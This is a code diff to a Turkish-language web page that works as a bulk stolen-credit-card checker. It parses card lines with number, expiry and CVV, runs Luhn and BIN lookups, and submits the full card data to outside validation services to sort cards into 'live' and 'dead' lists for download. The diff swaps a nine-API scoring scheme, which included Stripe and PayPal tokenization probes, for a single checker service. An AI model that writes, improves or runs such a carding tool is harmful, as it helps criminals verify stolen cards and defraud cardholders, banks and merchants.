@@ -95,7 +95,24 @@
 </div>
 
 <script>
-// 1. BİN API → binlist.net (ÜCRETSİZ, CORS, GERÇEK ZAMANLI)
+// LUHN ALGORİTMASI
+function luhnCheck(cardNumber) {
+    const digits = cardNumber.replace(/\D/g, '').split('').map(Number);
+    let sum = 0;
+    let alternate = false;
+    for (let i = digits.length - 1; i >= 0; i--) {
+        let digit = digits[i];
+        if (alternate) {
+            digit *= 2;
+            if (digit > 9) digit -= 9;
+        }
+        sum += digit;
+        alternate = !alternate;
+    }
+    return sum % 10 === 0;
+}
+
+// 1. BİN BİLGİSİ → binlist.net (ÜCRETSİZ, CORS, TÜM BİN'LER)
 async function getBinInfo(bin) {
     try {
         const res = await fetch(`https://lookup.binlist.net/${bin}`, {
@@ -106,17 +123,19 @@ async function getBinInfo(bin) {
         return {
             brand: (data.scheme || "Bilinmeyen").toUpperCase(),
             type: (data.type || "Bilinmeyen").toUpperCase(),
-        bank: data.bank?.name || "Bilinmeyen Bank",
+            bank: data.bank?.name || "Bilinmeyen Bank",
             country: data.country?.name || "Bilinmeyen",
-            flag: data.country?.alpha2 || "??"
+            flag: data.country?.alpha2 || "??",
+            level: data.brand || "Bilinmeyen",
+            prepaid: data.prepaid ? "Evet" : "Hayır"
         };
     } catch (e) {
         return null;
     }
 }
 
-// 2. CC CHECKER API → chkr.cc (ÜCRETSİZ, CORS, LIVE/DEAD + BANK/TYPE/COUNTRY)
-async function checkCCLive(cardLine) {
+// 2. CANLI/ÖLÜ → chkr.cc (ÜCRETSİZ, CORS, GERÇEK ZAMANLI)
+async function checkLiveDead(cardLine) {
     const [number, month, year, cvv] = cardLine.split('|').map(s => s.trim());
     try {
         const res = await fetch('https://api.chkr.cc/v1/validate', {
@@ -131,166 +150,16 @@ async function checkCCLive(cardLine) {
         });
         const data = await res.json();
         return {
-            isLive: data.valid === true,
-            bank: data.bank || "Bilinmeyen",
-            type: data.type || "Bilinmeyen",
-            country: data.country || "Bilinmeyen"
+            valid: data.valid === true,
+            message: data.message || "Bilinmeyen",
+            risk: data.risk || "Bilinmeyen"
         };
     } catch (e) {
-        return { isLive: false, bank: "Bilinmeyen", type: "Bilinmeyen", country: "Bilinmeyen" };
+        return { valid: false, message: "API Hatası", risk: "Yüksek" };
     }
 }
 
-// 3. STRIPE TEST API (SANDBOX)
-async function checkStripe(cardLine) {
-    const [number, month, year, cvv] = cardLine.split('|');
-    try {
-        const data = new URLSearchParams();
-        data.append('card[number]', number);
-        data.append('card[exp_month]', month);
-        data.append('card[exp_year]', year.length === 2 ? year : year.slice(-2));
-        data.append('card[cvc]', cvv);
-
-        const res = await fetch('https://api.stripe.com/v1/tokens', {
-            method: 'POST',
-            body: data,
-            headers: {
-                'Authorization': 'Bearer pk_test_51J2V2pSHn2v3oK8z3z3z3z3z3z3z3z3z3z3z3z3z3z3z3z3z3z3z3z3z3z3z',
-                'Content-Type': 'application/x-www-form-urlencoded'
-            }
-        });
-        return res.ok ? 'LIVE' : 'DEAD';
-    } catch (e) {
-        return 'DEAD';
-    }
-}
-
-// 4. BINCODES API (ÜCRETSİZ CC VALIDATION)
-async function checkBincodes(bin) {
-    try {
-        const res = await fetch(`https://bincodes.com/api/v1/${bin}?format=json`);
-        if (!res.ok) return null;
-        const data = await res.json();
-        return {
-            brand: data.brand || "Bilinmeyen",
-            type: data.type || "Bilinmeyen",
-            bank: data.bank || "Bilinmeyen Bank",
-            country: data.country || "Bilinmeyen"
-        };
-    } catch (e) {
-        return null;
-    }
-}
-
-// 5. CHKR API (ÜCRETSİZ CC CHECKER)
-async function checkChkr(cardLine) {
-    const [number, month, year, cvv] = cardLine.split('|');
-    try {
-        const res = await fetch('https://api.chkr.cc/v1/validate', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                card_number: number,
-                expiry_month: month,
-                expiry_year: year.length === 2 ? '20' + year : year,
-                cvv: cvv
-            })
-        });
-        const data = await res.json();
-        return data.valid ? 'LIVE' : 'DEAD';
-    } catch (e) {
-        return 'DEAD';
-    }
-}
-
-// 6. CREDITCARD-API (ÜCRETSİZ BIN/CC VALIDATION)
-async function checkCreditCardAPI(bin) {
-    try {
-        const res = await fetch(`https://api.creditcardvalidator.com/api/v1/validate?cc=${bin}`);
-        if (!res.ok) return null;
-        const data = await res.json();
-        return {
-            brand: data.card_type || "Bilinmeyen",
-            type: data.card_level || "Bilinmeyen",
-            bank: data.issuer || "Bilinmeyen Bank",
-            country: data.country || "Bilinmeyen"
-        };
-    } catch (e) {
-        return null;
-    }
-}
-
-// 7. VALIDATECARD API (ÜCRETSİZ CC VALIDATION)
-async function checkValidateCard(cardLine) {
-    const [number, month, year, cvv] = cardLine.split('|');
-    try {
-        const res = await fetch('https://validatecard.com/api/validate', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ number, month, year: year.length === 2 ? '20' + year : year, cvv })
-        });
-        return res.ok ? 'LIVE' : 'DEAD';
-    } catch (e) {
-        return 'DEAD';
-    }
-}
-
-// 8. CCVALIDATOR API (ÜCRETSİZ CC CHECKER)
-async function checkCCValidator(cardLine) {
-    const [number, month, year, cvv] = cardLine.split('|');
-    try {
-        const res = await fetch('https://ccvalidator.com/api/v1/check', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ number, expiry_month: month, expiry_year: year.length === 2 ? '20' + year : year, cvv })
-        });
-        return res.ok ? 'LIVE' : 'DEAD';
-    } catch (e) {
-        return 'DEAD';
-    }
-}
-
-// 9. PAYPAL SANDBOX API (ÜCRETSİZ CC VALIDATION)
-async function checkPayPal(cardLine) {
-    const [number, month, year, cvv] = cardLine.split('|');
-    try {
-        const data = {
-            intent: 'sale',
-            payer: { payment_method: 'credit_card', funding_instruments: [{
-                credit_card: { number, type: 'visa', expire_month: parseInt(month), expire_year: parseInt(year), cvv2: cvv, first_name: 'Test', last_name: 'User' }
-            }] },
-            transactions: [{ amount: { total: '1.00', currency: 'USD' } }]
-        };
-        const res = await fetch('https://api-m.sandbox.paypal.com/v1/payments/payment', {
-            method: 'POST',
-            headers: {
-                'Authorization': 'Bearer A21AAH... (SANDBOX TOKEN)',
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify(data)
-        });
-        return res.ok ? 'LIVE' : 'DEAD';
-    } catch (e) {
-        return 'DEAD';
-    }
-}
-
-// 10. EXXEN API SIMÜLASYON (CC VALIDATION)
-async function checkExxen(cardLine) {
-    const [number, month, year, cvv] = cardLine.split('|');
-    try {
-        const res = await fetch('https://api.exxen.com/v1/payment/validate', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ card_number: number, expiry_month: month, expiry_year: year.length === 2 ? '20' + year : year, cvc: cvv })
-        });
-        return res.ok ? 'LIVE' : 'DEAD';
-    } catch (e) {
-        return 'DEAD';
-    }
-}
-
-// GLOBAL DEĞİŞKENLER
+// GLOBAL
 let liveCards = [], deadCards = [], total = 0, checked = 0;
 
 async function checkCard(cardLine) {
@@ -300,39 +169,24 @@ async function checkCard(cardLine) {
     const bin = number.substring(0, 6);
     const isLuhn = luhnCheck(number);
     const binInfo = await getBinInfo(bin);
-    const stripeStatus = await checkStripe(cardLine);
-    const threeDSStatus = await check3DS(cardLine);
-    const bincodesStatus = await checkBincodes(bin);
-    const chkrStatus = await checkChkr(cardLine);
-    const creditCardStatus = await checkCreditCardAPI(bin);
-    const validateCardStatus = await checkValidateCard(cardLine);
-    const ccValidatorStatus = await checkCCValidator(cardLine);
-    const payPalStatus = await checkPayPal(cardLine);
-    const exxenStatus = await checkExxen(cardLine);
+    const chkrResult = await checkLiveDead(cardLine);
 
-    // MANTIKLI CANLI/ÖLÜ: LUHN + API'LERİN ÇOĞU OK
-    const apiScores = [stripeStatus, threeDSStatus, bincodesStatus, chkrStatus, creditCardStatus, validateCardStatus, ccValidatorStatus, payPalStatus, exxenStatus].filter(s => s === 'LIVE').length;
-    const isLive = isLuhn && apiScores >= 3; // 3+ API OK = CANLI
+    const isLive = isLuhn && binInfo !== null && chkrResult.valid === true;
 
     const result = {
         number, month, year, cvv,
         bin,
-        brand: binInfo?.brand || "BİLİNMEYEN",
-        type: binInfo?.type || "BİLİNMEYEN",
-        bank: binInfo?.bank || "BİLİNMEYEN BANK",
-        country: binInfo?.country || "BİLİNMEYEN",
+        brand: binInfo?.brand || "Bilinmeyen",
+        type: binInfo?.type || "Bilinmeyen",
+        bank: binInfo?.bank || "Bilinmeyen Bank",
+        country: binInfo?.country || "Bilinmeyen",
         flag: binInfo?.flag || "??",
+        level: binInfo?.level || "Bilinmeyen",
+        prepaid: binInfo?.prepaid || "Bilinmeyen",
         luhn: isLuhn ? "GEÇER" : "GEÇMEZ",
-        stripe: stripeStatus,
-        threeDS: threeDSStatus,
-        bincodes: bincodesStatus,
-        chkr: chkrStatus,
-        creditCard: creditCardStatus,
-        validateCard: validateCardStatus,
-        ccValidator: ccValidatorStatus,
-        payPal: payPalStatus,
-        exxen: exxenStatus,
-        apiScore: apiScores,
+        chkrValid: chkrResult.valid ? "Evet" : "Hayır",
+        chkrMessage: chkrResult.message,
+        chkrRisk: chkrResult.risk,
         status: isLive ? "CANLI" : "ÖLÜ"
     };
 
@@ -352,8 +206,8 @@ function updateResults() {
         const div = document.createElement('div');
         div.className = 'list-item';
         div.innerHTML = `<b>${c.number}</b> | ${c.month}/${c.year} | ${c.cvv}<br>
-                         ${c.brand} ${c.type} | ${c.bank}<br>
-                         ${c.country} ${c.flag} | LUHN: ${c.luhn} | API: ${c.apiScore}/9`;
+                         ${c.brand} ${c.type} (${c.level}) | ${c.bank}<br>
+                         ${c.country} ${c.flag} | Luhn: ${c.luhn} | Risk: ${c.chkrRisk}`;
         liveList.appendChild(div);
     });
     document.getElementById('live-count').textContent = liveCards.length;
@@ -367,8 +221,8 @@ function updateResults() {
         const div = document.createElement('div');
         div.className = 'list-item';
         div.innerHTML = `<b>${c.number}</b> | ${c.month}/${c.year} | ${c.cvv}<br>
-                         ${c.brand} ${c.type} | ${c.bank}<br>
-                         ${c.country} ${c.flag} | LUHN: ${c.luhn} | API: ${c.apiScore}/9`;
+                         ${c.brand} ${c.type} (${c.level}) | ${c.bank}<br>
+                         ${c.country} ${c.flag} | Luhn: ${c.luhn} | Risk: ${c.chkrRisk}`;
         deadList.appendChild(div);
     });
     document.getElementById('dead-count').textContent = deadCards.length;
@@ -382,10 +236,9 @@ function updateResults() {
         const div = document.createElement('div');
         div.className = `result ${c.status === 'ÖLÜ' ? 'dead' : ''}`;
         div.innerHTML = `<b>${c.number}|${c.month}|${c.year}|${c.cvv}</b><br>
-                         BİN: ${c.bin} | ${c.brand} ${c.type} | ${c.bank}<br>
-                         ${c.country} ${c.flag} | LUHN: ${c.luhn} | STRIPE: ${c.stripe} | 3DS: ${c.threeDS}<br>
-                         BINCODES: ${c.bincodes} | CHKR: ${c.chkr} | CREDITCARD: ${c.creditCard} | VALIDATE: ${c.validateCard}<br>
-                         CCVALIDATOR: ${c.ccValidator} | PAYPAL: ${c.payPal} | EXXEN: ${c.exxen} | API: ${c.apiScore}/9 → <b>${c.status}</b>`;
+                         BİN: ${c.bin} | ${c.brand} ${c.type} (${c.level}) | ${c.bank}<br>
+                         ${c.country} ${c.flag} | Luhn: ${c.luhn} | CHKR: ${c.chkrValid}<br>
+                         Mesaj: ${c.chkrMessage} | Risk: ${c.chkrRisk} → <b>${c.status}</b>`;
         details.appendChild(div);
     });
 
@@ -411,7 +264,7 @@ function downloadCards(type) {
 
 async function startCheck() {
     const input = document.getElementById('cards').value.trim();
-    if (!input) return alert("Kart gir!");
+    if (!input) return alert("Kart gir lan!");
 
     const lines = input.split('\n').map(l => l.trim()).filter(l => l);
     if (lines.length > 250) return alert("Max 250 kart!");
@@ -428,7 +281,7 @@ async function startCheck() {
 
     for (const line of lines) {
         await checkCard(line);
-        await new Promise(r => setTimeout(r, 600)); // API limit için
+        await new Promise(r => setTimeout(r, 800)); // API limit için
     }
 
     document.getElementById('loading').style.display = 'none';
